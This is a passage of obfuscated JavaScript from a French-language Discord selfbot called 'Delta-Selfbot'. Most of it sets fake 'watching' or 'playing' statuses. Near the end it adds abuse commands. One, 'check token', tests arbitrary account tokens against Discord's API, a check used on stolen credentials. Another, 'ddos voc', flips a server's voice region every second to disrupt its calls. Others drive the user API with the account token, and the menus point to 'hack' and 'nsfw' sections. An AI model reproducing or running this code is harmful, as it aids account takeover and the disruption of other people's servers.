                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Snapchat executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Snapchat**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'facebook')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'facebook')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Facebook')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Skype')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Facebook executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Facebook**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'tiktok')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'tiktok')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Tiktok')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Tiktok')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Tiktok executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Tiktok**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'twitter')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'twitter')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Twitter')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Twitter')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Twitter executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Twitter**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'instagram')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'instagram')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Instagram')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Instagram')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Instagram executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Instagram**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'youtube')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'youtube-don-george-floyd')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Youtube')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Youtube')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Youtube executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Youtube**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'tokyo ghoul')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'tokyoghoul')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Tokyo Ghoul')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Tokyo Ghoul')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Tokyo Ghoul executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(2)
                            .join(' ') || 'Delta-Selfbot') + ' sur Tokyo Ghoul**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'hunter x hunter')) {
            let _0x18f2x40 = _0x18f2x3d.splice(3)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'hunter-x-hunter-logo')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Hunter X Hunter')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Hunter X Hunter')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Hunter X Hunter executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(3)
                            .join(' ') || 'Delta-Selfbot') + ' sur Hunter X Hunter**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'naruto')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'narutoto')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Naruto')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Naruto')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Naruto executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Naruto**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'pornhub')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', '8zgrvjp7iab11')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Pornhub')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('WATCHING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Pornhub')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Pornhub executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu regardes ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Pornhub**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'clash of clan')) {
            let _0x18f2x40 = _0x18f2x3d.splice(3)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'clash-of-clans-app-icon')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Clash Of Clan')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Clash Of Clan executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(3)
                            .join(' ') || 'Delta-Selfbot') + ' sur Clash Of Clan**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'minecraft')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'minecraft-creeper-face')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Minecraft')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Minecraft executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Minecraft**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'clash royal')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'clashroyal')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Clash Royal')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Clash Royal executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
                            .join(' ') || 'Delta-Selfbot') + ' sur Clash Royal**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'tinder')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'tinder')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Tinder')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Tinder executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Tinder**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'roblox')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'webp45')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Roblox')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Roblox executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Roblox**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'badlion')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Badlion')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Badlion executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Badlion**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'apex')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage_1_')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Apex Legends')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande Apex Legends executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur Apex Legends**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'csgo')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'previewfile_1508497274')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Counter Strike')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande csgo executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur csgo**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'among us')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage_2_')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Among us')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande among us executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
                            .join(' ') || 'Delta-Selfbot') + ' sur among us**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'fortnite')) {
            let _0x18f2x40 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'webp_net-resizeimage')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Fortnite')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande fortnite executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(1)
                            .join(' ') || 'Delta-Selfbot') + ' sur fortnite**');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'rocket league')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ') || 'Delta-Selfbot';
            rpcGenerator.getRpcImage('721465320740487179', 'rocket_league')
                .then(_0x18f2x2e =>

                    {
                        let _0x18f2x30 = new rpcGenerator.Rpc()
                            .setName('Rocket League')
                            .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                            .setType('PLAYING')
                            .setApplicationId('721465320740487179')
                            .setDetails('Delta Selfbot')
                            .setAssetsLargeImage(_0x18f2x2e.id)
                            .setAssetsLargeText('Delta-Selfbot')
                            .setState(_0x18f2x40)
                            .setStartTimestamp(Date.now())
                            .setParty({
                                id: uuid()
                            });
                        client.user.setPresence(_0x18f2x30.toDiscord())
                            .catch(console.error);
                        console.log('Commande rocket league executé'.yellow);
                        _0x18f2x3b.edit(':white_check_mark: **Tu joues à ' + (_0x18f2x3d.splice(2)
                            .join(' ') || 'Delta-Selfbot') + ' sur rocket league**');
                    });
        }
        if (_0x18f2x3c.content === prefix + 'channels list') {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)** ' }${ _0x18f2x42['map'](_0x18f2x41 => {
                    return _0x18f2x41['name'];
                }) }${ '' }`);
            }
            const _0x18f2x42 = _0x18f2x3b.guild.channels;
            var _0x18f2x43 = new Discord.RichEmbed()
                .setFooter('Delta-Selfbot')
                .setColor(color)
                .addField('liste des salons:', _0x18f2x42.map(_0x18f2x41 =>

                    {
                        return _0x18f2x41.name;
                    }));
            for (pas = 0; pas < 10; pas++) {
                _0x18f2x43.setColor(color);
                _0x18f2x3b.edit(_0x18f2x43)
                    .catch(_0x18f2x44 => {
                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                        });
            }
            console.log('Commande channels list executé'.yellow);
        }
        if (_0x18f2x3c.content === prefix + 'roles list') {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)** ' }${ _0x18f2x46['map'](_0x18f2x45 => {
                    return _0x18f2x45['name'];
                }) }${ '' }`);
            }
            const _0x18f2x46 = _0x18f2x3b.guild.roles;
            var _0x18f2x47 = new Discord.RichEmbed()
                .setFooter('Delta-Selfbot')
                .setColor(color)
                .addField('liste des roles:', _0x18f2x46.map(_0x18f2x45 =>

                    {
                        return _0x18f2x45.name;
                    }));
            _0x18f2x3b.edit(_0x18f2x47)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande roles list executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'cmd') {
            _0x18f2x3b.edit(cmd)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande cmd executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help') {
            _0x18f2x3b.edit(help)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help backup') {
            _0x18f2x3b.edit(help_backup)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help backup executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help hack') {
            _0x18f2x3b.edit(help_hack)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help hack executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help statut') {
            _0x18f2x3b.channel.send(help_statut2);
            _0x18f2x3b.edit(help_statut)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help statut executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help fun') {
            _0x18f2x3b.edit(help_fun)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help fun executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help moderation') {
            _0x18f2x3b.edit(help_moderation)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help moderation executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help nsfw') {
            _0x18f2x3b.edit(help_nsfw)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help nsfw executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'help utile') {
            _0x18f2x3b.edit(help_info)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande help info executé'.yellow);
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
            const _0x18f2x13 = _0x18f2x3b.mentions.users.first() || _0x18f2x3b.author;
            const _0x18f2x48 = new Discord.RichEmbed()
                .setAuthor(_0x18f2x13.username)
                .setImage(_0x18f2x13.avatarURL)
                .setColor(color)
                .setFooter('Delta-Selfbot');
            _0x18f2x3b.edit(_0x18f2x48)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande avatar executé'.yellow);
        };
        if (_0x18f2x3b.content === prefix + 'change hypesquad brilliance') {
            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
            request(_0x18f2x49, {
                method: 'POST',
                headers: {
                    authorization: token,
                    'content-type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                },
                body: JSON.stringify({
                    'house_id': 2
                })
            });
            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**');
            console.log('Commande change hypesquad executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'change hypesquad ballance') {
            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
            request(_0x18f2x49, {
                method: 'POST',
                headers: {
                    authorization: token,
                    'content-type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                },
                body: JSON.stringify({
                    'house_id': 3
                })
            });
            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**');
            console.log('Commande change hypesquad executé'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'change hypesquad bravery') {
            let _0x18f2x49 = 'https://discordapp.com/api/v6/hypesquad/online';
            request(_0x18f2x49, {
                method: 'POST',
                headers: {
                    authorization: token,
                    'content-type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                },
                body: JSON.stringify({
                    'house_id': 1
                })
            });
            _0x18f2x3c.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'bravery\'**');
            console.log('Commande change hypesquad executé'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'check token')) {
            let _0x18f2x40 = _0x18f2x3d.splice(2)
                .join(' ');
            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
            request(_0x18f2x49, {
                    method: 'GET',
                    headers: {
                        authorization: _0x18f2x40
                    }
                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)

                {
                    if (_0x18f2x4a.statusCode === 200) {
                        var _0x18f2x4c = new Discord.RichEmbed()
                            .setTitle('Token info')
                            .setDescription('Le token: ' + _0x18f2x3d.splice(2)
                                .join(' ') + ' \\n**est 100% valide** :white_check_mark:')
                            .setColor(color)
                            .setTimestamp()
                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
                        _0x18f2x3b.edit(_0x18f2x4c)
                            .catch(_0x18f2x44 =>

                                {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                    }
                });
        }
        if (_0x18f2x3b.content == prefix + 'ddos voc') {
            if (!_0x18f2x3c.guild) {
                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            let _0x18f2x4e = 0;
            const _0x18f2x4f = [
                'japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'
            ];
            setInterval(() =>

                {
                    _0x18f2x3b.guild.setRegion('japan');
                    0;
                    if (1 == _0x18f2x4f.length) {
                        _0x18f2x4e = 0;
                    }
                }, 1000);
            _0x18f2x3c.edit('**Commande ddos vocal activé**');
            console.log('Commande ddos vocal executé'.yellow);
        }
        if (_0x18f2x3b.content == prefix + 'ddos-stop') {
            if (!_0x18f2x3c.guild) {
